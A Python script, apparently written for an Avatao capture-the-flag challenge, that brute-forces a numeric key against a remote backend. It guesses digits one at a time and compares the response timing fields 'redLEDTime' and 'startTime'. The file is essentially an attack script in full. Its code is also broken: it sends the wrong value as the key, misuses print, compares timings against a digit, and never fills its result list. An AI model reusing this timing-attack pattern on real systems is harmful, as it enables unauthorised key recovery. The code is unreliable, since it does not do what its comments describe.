import requests
import time
import json

# URL to post data to
url = "https://a43b51ea447c5547b8878bd2edf3374f.3-248-160-167.avatao-challenge.com/backend/remote.php"

# Create session to post data and read responses
conn = requests.session()

# header valies, required for the POST to succeed for whatever reason
h = {
    "Host": "a43b51ea447c5547b8878bd2edf3374f.3-248-160-167.avatao-challenge.com",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest",
}

# result set
res = []

# Try sending data, read start and red light time to get the timing neded to process input
# the longer the input the more likely it is that the number guessed is correct
for _ in range(10):
    # try all 10 nubmers
    maxv = 0
    part = []
    part.append(str(_))
    # print results
    print(res)
    for n in range(10):
        # max time to find out which number was the correct one
        # create key
        key = ""
        for c in part:
            key += str(c)
        key += str(n)
        # create payload wit the key
        for _ in range(10-len(part)-1):
            key += "0"
        # add key to parameters
        p = {
            "key": str(n)
        }
        print(p)
        # POST data to url and process results
        r = conn.post(url,data=p,headers=h)
        time.sleep(1)
        # load json data and get what time it took for the red light to come up
        vals = json.loads(r.content.decode())
        print(p["key"]) + " - " + str((vals['redLEDTime'] - vals['startTime']+1.5))
        # if the redLEDTime is larger than the current largest, replace it
        # print(vals['redLEDTime'] - vals['startTime'])
        if (vals['redLEDTime'] - vals['startTime']+1.5) > maxv:
            maxv = n
    # add max value to results
    part.append(maxv)
        


print(res)
